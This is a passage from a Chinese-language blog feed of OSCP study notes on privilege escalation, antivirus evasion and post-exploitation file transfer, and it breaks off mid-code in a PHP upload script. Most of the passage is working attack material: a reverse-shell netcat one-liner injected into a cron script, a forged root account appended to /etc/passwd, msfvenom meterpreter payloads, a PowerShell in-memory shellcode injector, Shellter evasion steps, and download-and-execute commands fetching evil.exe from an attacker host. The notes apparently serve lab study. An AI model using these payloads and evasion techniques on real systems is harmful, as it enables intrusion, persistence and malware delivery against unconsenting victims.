Files\My.exe</li><li>C:\Program Files\My Program\My.exe</li><li>C:\Program Files\My Program\My service\service.exe</li></ul></li><li>生成以上任意路径的程序, 均以服务账号运行</li></ul><h3 id="提权练习-4-内核漏洞"><a href="#提权练习-4-内核漏洞" class="headerlink" title="提权练习-4 内核漏洞"></a>提权练习-4 内核漏洞</h3><ul><li>利用内核或第三方驱动漏洞时, 可能触发蓝屏死机。我们必须仔细注意几个因素，包括目标的操作系统、版本和体系结构</li><li>检测系统版本、架构<ul><li><code>C:\&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; /C:&quot;System Type&quot;</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818182948.png"></li></ul></li><li>枚举驱动<ul><li><code> C:\Users\student\Desktop&gt;driverquery /v</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818182936.png"></li></ul></li><li>查询版本<ul><li><code>C:\Users\n00b&gt; cd &quot;C:\Program Files&quot;</code></li><li><code>C:\Program Files\USBPcap&gt; type USBPcap.inf</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818183005.png"></li></ul></li><li>搜索已知漏洞<ul><li><code>kali@kali:~# searchsploit USBPcap</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818183019.png"></li></ul></li></ul><h2 id="Linux提权练习"><a href="#Linux提权练习" class="headerlink" title="Linux提权练习"></a>Linux提权练习</h2><h3 id="提权练习-1-文件权限漏洞"><a href="#提权练习-1-文件权限漏洞" class="headerlink" title="提权练习-1 文件权限漏洞"></a>提权练习-1 文件权限漏洞</h3><ul><li>查看日志发现系统调度任务&#x2F;var&#x2F;log&#x2F;cron.log<ul><li><code>student@debian:~$ grep &quot;CRON&quot; /var/log/cron.log</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818183237.png"></li></ul></li><li>如果有权限修改则在里面注入反弹shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@debian:/var/scripts$ <span class="hljs-built_in">echo</span> &gt;&gt; user_backup.sh<br>student@debian:/var/scripts$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|</span><br><span class="hljs-string">nc 10.11.0.4 1234 &gt;/tmp/f&quot;</span> &gt;&gt; user_backups.sh student@debian:/var/scripts$ <span class="hljs-built_in">cat</span> user_backups.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cp</span> -rf /home/student/ /var/backups/student/<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.0.4 1234 &gt;/tmp/f<br></code></pre></td></tr></table></figure></li></ul><h3 id="提权练习-2-x2F-etc-x2F-passwd权限漏洞"><a href="#提权练习-2-x2F-etc-x2F-passwd权限漏洞" class="headerlink" title="提权练习-2 &#x2F;etc&#x2F;passwd权限漏洞"></a>提权练习-2 &#x2F;etc&#x2F;passwd权限漏洞</h3><ul><li>如果文件可修改, 就可以写入管理员账号实现提权</li><li>生成密码<ul><li><code>student@debian:~$ openssl passwd evil</code></li></ul></li><li>添加账号<ul><li><code>student@debian:~$ echo &quot;root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</code></li></ul></li><li>切换到root2<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@debian:~$ su root2<br>Password: evil<br>root@debian:/home/student<span class="hljs-comment"># id </span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure></li></ul><h3 id="提权联系-3-内核漏洞"><a href="#提权联系-3-内核漏洞" class="headerlink" title="提权联系-3 内核漏洞"></a>提权联系-3 内核漏洞</h3><ul><li>查看发行版, 内核, 架构</li><li>编译完上传后给权限就行</li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>规避杀毒软件</title>
    <link href="/2022/08/17/%E8%A7%84%E9%81%BF%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/"/>
    <url>/2022/08/17/%E8%A7%84%E9%81%BF%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="防病毒软件"><a href="#防病毒软件" class="headerlink" title="防病毒软件"></a>防病毒软件</h3><ul><li>规避防病毒软件是后渗透测试阶段的重要步骤</li><li>最初防病毒软件只用于查杀计算机病毒软件</li><li>现在AV产品包含FW、WEB站点扫描等能力</li><li>绝对的免杀是耗时且很难长期实现的(AV软件厂商在不断变化)</li></ul><h2 id="AV检测技术"><a href="#AV检测技术" class="headerlink" title="AV检测技术"></a>AV检测技术</h2><h3 id="防病毒检测方法"><a href="#防病毒检测方法" class="headerlink" title="防病毒检测方法"></a>防病毒检测方法</h3><ul><li>PE: Protable Executable 包含可执行文件和对象文件。PE文件使用一个Windows数据结构, 详细对应Windows加载器执行代码、引用库、导入和导出API表等具体信息</li><li>生成测试文件<ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe &gt; binary.exe</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817194518.png"></li></ul></li></ul><h3 id="防病毒厂商的检测方法"><a href="#防病毒厂商的检测方法" class="headerlink" title="防病毒厂商的检测方法"></a>防病毒厂商的检测方法</h3><ul><li>基于字符特征的检测方法<ul><li>特征码是恶意软件中唯一的一组连续的字节序列, 相当于黑名单机制</li><li>修改(修改一组无害的字符–修改大小写)或混淆特征码可以绕过AV软件的检测</li><li>AV厂商经常更新特征码, 而且不同厂商的特征码也不尽相同, 因此很难找到通用的免杀方法</li></ul></li><li>启发式检测方法<ul><li>依赖于各种规则和算法来确定一个动作是否是恶意的</li><li>通常通过单步跟踪程序运行, 或反编译分析源码来实现检测, 寻找各种恶意的模式和调用行为</li></ul></li><li>基于行为的检测方法<ul><li>动态分析程序的行为, 在模拟环境中执行程序(虚拟机), 查找恶意的行为和动作</li></ul></li><li>以上两种方法不基于特征字符, 因此一定程度可发现未知病毒<ul><li>大部分杀毒软件都会综合使用以上方法</li></ul></li></ul><h2 id="AV躲避技术"><a href="#AV躲避技术" class="headerlink" title="AV躲避技术"></a>AV躲避技术</h2><h3 id="AV躲避技术-1"><a href="#AV躲避技术-1" class="headerlink" title="AV躲避技术"></a>AV躲避技术</h3><ul><li>AV躲避技术分为两大类<ul><li>磁盘中(修改存储在硬盘中的文件)</li><li>内存中(现在恶意软件主要食用方法)<h3 id="磁盘中躲避技术-修改、混淆磁盘中的文件"><a href="#磁盘中躲避技术-修改、混淆磁盘中的文件" class="headerlink" title="磁盘中躲避技术(修改、混淆磁盘中的文件)"></a>磁盘中躲避技术(修改、混淆磁盘中的文件)</h3></li></ul></li><li>打包: 打包后体积更小、特征码不同, 单一使用此方法, 不足以规避目前主流AV软件的查杀</li><li>混淆: 最初用于软件开发者保护自己的知识产权。花指令 重组 变异代码 语义等价替换 分隔和重排序函数, 增加逆向分析难度, 对于基于特征码的检测方法比较有效</li><li>加密Cyberers: 加密软件, 增加解密存根, 执行时在内存中解密执行代码, 磁盘中只有加密的文件。改变了可执行代码, 作为最有效的反病毒规避技术之一, 加密已经成为现代恶意软件的基础</li><li>软件保护: 结合以上方法, 同时增加反逆向、反调试、虚拟机检测等技术。即用于软件保护, 也可用于AV规避, 由于相关技术太复杂, 目前没有开源AV规避产品, 商业工具The Enigma Protector</li></ul><h3 id="内存中躲避技术"><a href="#内存中躲避技术" class="headerlink" title="内存中躲避技术"></a>内存中躲避技术</h3><ul><li><p>内存中注入也叫PE Injection, 是目前主流的AV躲避技术</p></li><li><p>优点是不向硬盘写文件(AV软件重点关注)</p></li><li><p>需要独立编写代码实现内存注入</p></li><li><p>远程进程内存注入技术</p><ul><li>利用Windows API, 向正常PE进程注入恶意代码</li><li>首先通过OpenProcess函数获得可用的有权访问的HANDLE</li><li>获得 HANDLE 后, 在该进程的上下文中分配内存, 调用诸如 VirtualAllocEx 之类的 Windows API</li><li>使用WriteProcessMemory等函数将恶意代码注入新分派的内存中</li><li>通过CreateRemoteThread API 在新内存中执行恶意代码</li></ul></li><li><p>反射DLL注入技术</p><ul><li>传统DLL注入通过LoadLibrary API从硬盘中加载恶意DLL文件</li><li>高级用法加载存储在进程内存中的DLL</li><li>LoadLibrary不支持从内存加载DLL, Windows也未公开任何可以实现内存中加载DLL的方法</li><li>使用这种方法的攻击者, 必须自己开发API</li></ul></li><li><p>进程挖空技术(Process Hollowing)</p><ul><li>攻击者首先在挂起状态下启动一个非恶意进程</li><li>从内存中删除进程的映像, 并替换为恶意程序映像</li><li>然后恢复进程, 并执行恶意代码, 而不是合法进程</li></ul></li><li><p>内连挂载技术(Inline Hooking)</p><ul><li>修改内存并在函数中引入一个钩子(重定向代码执行的指令) 来将执行流指向我们的恶意代码</li><li>执行恶意代码后, 流将返回到之前的函数并技术执行, 看起来就像只执行了原始代码代码一样</li></ul></li></ul><h3 id="AV躲避实例"><a href="#AV躲避实例" class="headerlink" title="AV躲避实例"></a>AV躲避实例</h3><ul><li><p>PowerShell内存中注入</p><ul><li>使用类似于远程进程注入的方法, 将恶意代码注入到powershell当前进程</li><li>Powershell调用Windows API, 因此可实现内存中注入进程</li><li>注入的脚本代码在Powershell进程中执行程序</li><li>与执行程序相比, PS脚本不容易被查杀(AV软件经常通过变量名、注释和逻辑检测脚本)</li></ul></li><li><p>代码思路</p><ol><li>该脚本首先从 kernel32.dll 导入 VirtualAlloc 和 CreateThread 以及从 msvcrt.dll 导入 memset。这些函数将允许我们分别分配内存、创建执行线程以及将任意数据写入分配的内存</li><li>在当前进程(powershell.exe)中分配内存, 并执行一个新线程</li><li>使用VirtualAlloc分配内存空间, 并将payload的每个字节存储在$sc字节阵列中</li><li>使用memset将payload写入到新分配的内存中</li><li>最后使用CreateThread, 在单独的线程中执行payload</li></ol></li></ul><figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocat</span><br><span class="hljs-string">ionType, uint flProtect);</span><br><span class="hljs-string"></span><br><span class="hljs-string">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="hljs-string"></span><br><span class="hljs-string">[DllImport(&quot;msvcrt.dll&quot;)]</span><br><span class="hljs-string">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#x27;</span>;<br><br><span class="hljs-variable">$winFunc</span> =<br>  <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-memberDefinition</span> <span class="hljs-variable">$code</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Win32&quot;</span> <span class="hljs-literal">-namespace</span> Win32Functions <span class="hljs-literal">-passthru</span>;<br><br>[<span class="hljs-built_in">Byte</span>[]];<br>[<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$sc</span> = &lt;place your shellcode here&gt;;<br><br><span class="hljs-variable">$size</span> = <span class="hljs-number">0</span>x1000;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$sc</span>.Length <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>x1000) &#123;<span class="hljs-variable">$size</span> = <span class="hljs-variable">$sc</span>.Length&#125;;<br><br><span class="hljs-variable">$x</span> = <span class="hljs-variable">$winFunc::VirtualAlloc</span>(<span class="hljs-number">0</span>,<span class="hljs-variable">$size</span>,<span class="hljs-number">0</span>x3000,<span class="hljs-number">0</span>x40);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> <span class="hljs-operator">-le</span> (<span class="hljs-variable">$sc</span>.Length<span class="hljs-literal">-1</span>);<span class="hljs-variable">$i</span>++) &#123;<span class="hljs-variable">$winFunc::memset</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>](<span class="hljs-variable">$x</span>.ToInt32()+<span class="hljs-variable">$i</span>), <span class="hljs-variable">$sc</span> [<span class="hljs-variable">$i</span>], <span class="hljs-number">1</span>)&#125;;<br><br><span class="hljs-variable">$winFunc::CreateThread</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$x</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-keyword">for</span> (;;) &#123; <span class="hljs-built_in">Start-sleep</span> <span class="hljs-number">60</span> &#125;;<br></code></pre></td></tr></table></figure><ul><li>生成payload<ul><li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell</code></li><li>将生产的$buf变量的值写入到脚本的$sc变量中</li><li>修改powershell执行策略<ul><li><code>PS C:\Users\offsec\Desktop&gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope C urrentUser</code></li></ul></li></ul></li></ul><h2 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h2><h3 id="Shellter-1"><a href="#Shellter-1" class="headerlink" title="Shellter"></a>Shellter</h3><ul><li><p>最流行的免费动态shellcode注入工具之一, 能够一定程度绕过杀毒软件</p><ul><li>对PE文件进行深入分析, 将payload注入到另一个正常文件之中</li><li>改变PE文件的Section权限, 并创建新的Section</li><li>使用现有的PE Import Address Table(IAT)条目来定位将用于内存分配、传输和执行负载的函数</li></ul></li><li><p>一个windows程序, 可以使用wine在kali上运行<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220818011427.png"></p></li><li><p>shellter支持自动(A)和手动(M)执行方式</p><ul><li>手动模式总, shellter会生成注入的代码, 也可定制</li></ul></li><li><p>指定注入的目标程序, 进行注入(注入前备份源文件)</p><ul><li>选择Stealth Mode, 以便执行注入代码后回复原执行流</li></ul></li><li><p>使用注入定制payload</p></li><li><p>持久化, 避免正常程序执行完成后, shell也终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> AutoRunScript post/windows/manage/migrate<br>AutoRunScript =&gt; post/windows/manage/migrate<br>msf exploit(multi/handler) &gt; exploit<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件传输</title>
    <link href="/2022/08/17/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/"/>
    <url>/2022/08/17/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</url>
    
    <content type="html"><![CDATA[<h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><ul><li>后渗透测试阶段: 突破边界并在目标主机商获得初始第权限账号</li><li>后渗透测试阶段任务<ol><li>权限提升</li><li>扩大控制</li><li>横向平移</li><li>安装后门</li><li>清理攻击痕迹</li><li>上传工具文件</li></ol></li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="传输攻击工具的风险"><a href="#传输攻击工具的风险" class="headerlink" title="传输攻击工具的风险"></a>传输攻击工具的风险</h3><ul><li>文档记录上传的攻击工具, 渗透结束后及时清除, 避免被其他人恶意利用</li><li>终端防病毒系统的干扰, 触发告警, 导致渗透失败</li><li>原则: 尽量使用目标系统本身已有的软件工具, 上传工具只作为补充</li></ul><h3 id="Pure-FTPd"><a href="#Pure-FTPd" class="headerlink" title="Pure-FTPd"></a>Pure-FTPd</h3><ul><li>安装<ul><li><code>kali@kali:~$ sudo apt update &amp;&amp; sudo apt install pure-ftpd</code></li></ul></li><li>创建服务账号<ul><li><code>./steup-ftp.sh</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>groupadd ftpgroup<br>useradd -g ftpgroup -d /dev/null -s /etc ftpuser <br>pure-pw useradd offsec -u ftpuser -d /ftphome <br>pure-pw mkdb<br><span class="hljs-built_in">cd</span> /etc/pure-ftpd/auth/<br><span class="hljs-built_in">ln</span> -s ../conf/PureDB 60pdb<br><span class="hljs-built_in">mkdir</span> -p /ftphome<br><span class="hljs-built_in">chown</span> -R ftpuser:ftpgroup /ftphome/<br>systemctl restart pure-ftpd<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817160333.png"></li></ul></li></ul><h3 id="非交互式Shell"><a href="#非交互式Shell" class="headerlink" title="非交互式Shell"></a>非交互式Shell</h3><ul><li>大部分nc类软件可建立非交互式shell, 但其功能受限<ul><li>基于nc shell 执行ftp交互命令或者vi编辑文本时, 皆无回显</li></ul></li><li>升级非交互式Shell<ul><li>Python 解释器经常安装在 Linux 系统上，带有一个名为 pty 的标准模块，允许创建伪终端<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817162700.png"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817162725.png"></p><h2 id="Windows系统传输文件"><a href="#Windows系统传输文件" class="headerlink" title="Windows系统传输文件"></a>Windows系统传输文件</h2><h3 id="Win传文件"><a href="#Win传文件" class="headerlink" title="Win传文件"></a>Win传文件</h3><ul><li>Linux默认安装netcat、wget、curl等软件, 传输文件相对容易, Win系统缺乏此类工具</li><li>非交互FTP下载<ul><li>Windows 操作系统附带可用于文件传输的默认 FTP 客户端(交互式程序), -s可以指定包含FTP指令的源文件, 实现非交互式传文件<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> open <span class="hljs-number">10.11</span>.<span class="hljs-number">0.4</span> <span class="hljs-number">21</span>&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> USER offsec &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> lab &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> bin &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> GET nc.exe &gt;&gt; ftp.txt<br>C:\Users\offsec&gt;<span class="hljs-built_in">echo</span> bye &gt;&gt; ftp.txt<br></code></pre></td></tr></table></figure></li></ul></li><li>利用以上指令源文件下载nc<ul><li><code>C:\Users\offsec&gt; ftp -v -n -s:ftp.txt</code></li></ul></li></ul><h3 id="使用脚本下载文件"><a href="#使用脚本下载文件" class="headerlink" title="使用脚本下载文件"></a>使用脚本下载文件</h3><ul><li><p>WinXP 2003可以用vbs下载文件</p></li><li><p>Win7 2008以上可以用powershell传输</p></li><li><p>VBScript脚本(wget.vbs)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> strUrl = WScript.Arguments.Item(<span class="hljs-number">0</span>) &gt; wget.vbs<br><span class="hljs-built_in">echo</span> StrFile = WScript.Arguments.Item(<span class="hljs-number">1</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_DEFAULT = <span class="hljs-number">0</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_PRECONFIG = <span class="hljs-number">0</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_DIRECT = <span class="hljs-number">1</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_PROXY = <span class="hljs-number">2</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Err.Clear &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = Nothing &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest&quot;</span>) &gt;&gt; wge t.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;MSXML2.ServerXMLHTTP&quot;</span>) &gt;&gt; <span class="hljs-built_in">wget</span>. vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) &gt;&gt; wget.vbs <span class="hljs-built_in">echo</span> http.Open <span class="hljs-string">&quot;GET&quot;</span>, strURL, False &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> http.Send &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = Nothing &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> fs = CreateObject(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> strData = <span class="hljs-string">&quot;&quot;</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> strBuffer = <span class="hljs-string">&quot;&quot;</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">For</span> lngCounter = <span class="hljs-number">0</span> to UBound(varByteArray) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> ts.Write Chr(<span class="hljs-number">255</span> And Ascb(Midb(varByteArray,lngCounter + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))) &gt;&gt; wget.vbs <span class="hljs-built_in">echo</span> Next &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> ts.Close &gt;&gt; wget.vbs<br></code></pre></td></tr></table></figure></li><li><p>运行脚本</p><ul><li><code>C:\Users\Offsec&gt; cscript wget.vbs http://10.11.0.4/evil.exe evil.exe</code></li></ul></li><li><p>powershell脚本</p><ul><li>Powershell默认策略、配置影响脚本的执行, 需要增加绕过限制的参数</li><li><code>C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro file -File wget.ps1</code></li><li>-ExecutionPolicy Bypass # 绕过默认执行策略</li><li>-NoLogo -NonInteractive # 隐藏powershell logo、banner、交互提示信息</li><li>-NoProfile # 禁用默认配置文件</li></ul></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$webclient</span> = <span class="hljs-built_in">New-Object</span> System.Net.WebClient &gt;&gt; wget.ps1<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://10.11.0.4/evil.exe&quot;</span> &gt;&gt; wget.ps1<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;new-exploit.exe&quot;</span> &gt;&gt; wget.ps1<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$webclient</span>.DownloadFile(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$file</span>) &gt;&gt; wget.ps1<br></code></pre></td></tr></table></figure><h3 id="解析域名地址"><a href="#解析域名地址" class="headerlink" title="解析域名地址"></a>解析域名地址</h3><ul><li>Powershell一行式命令下载文件<ul><li><code>C:\Users\Offsec&gt; powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http:/ /10.11.0.4/evil.exe&#39;, &#39;new-exploit.exe&#39;)</code></li></ul></li><li>下载后直接执行脚本(无文件落地)<ul><li><code>C:\Users\Offsec&gt; powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39; http://10.11.0.4/helloworld.ps1&#39;)</code></li></ul></li></ul><h3 id="exe2hex-powershell"><a href="#exe2hex-powershell" class="headerlink" title="exe2hex + powershell"></a>exe2hex + powershell</h3><ul><li>将执行程序转换为HEX字符串, 并将其嵌入到Windows脚本中<ul><li>powershell将HEX还原为二进制流并执行(非交互)</li></ul></li><li>压缩打包PE程序(二进制)<ul><li><code>kali@kali:~$ upx -9 nc.exe</code></li></ul></li><li>将PE文件转换为HEX格式<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817170456.png"></li><li>复制nc.cmd文件中的全部内容, 在非交互shell执行<ul><li>使用powershell还原并执行代码<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;<span class="hljs-variable">$h</span>=Get-Content -readcount 0 -path &#x27;./nc.hex&#x27;;<span class="hljs-variable">$l</span>=<span class="hljs-variable">$h</span>[0].length;<span class="hljs-variable">$b</span>=N ew-Object byte[] (<span class="hljs-variable">$l</span>/2);<span class="hljs-variable">$x</span>=0;for (<span class="hljs-variable">$i</span>=0;<span class="hljs-variable">$i</span> -le <span class="hljs-variable">$l</span>-1;<span class="hljs-variable">$i</span>+=2)&#123;<span class="hljs-variable">$b</span>[<span class="hljs-variable">$x</span>]=[byte]::Parse(<span class="hljs-variable">$h</span>[0].S ubstring(<span class="hljs-variable">$i</span>,2),[System.Globalization.NumberStyles]::HexNumber);<span class="hljs-variable">$x</span>+=1&#125;;set-content -enc oding byte &#x27;nc.exe&#x27; -value <span class="hljs-variable">$b</span>;Remove-Item -force nc.hex;&quot;</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220817170656.png"></li></ul></li></ul><h3 id="使用Windows脚本上传文件"><a href="#使用Windows脚本上传文件" class="headerlink" title="使用Windows脚本上传文件"></a>使用Windows脚本上传文件</h3><ul><li>在kali上创建接收脚本<ul><li>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$uploaddir</span> = <span 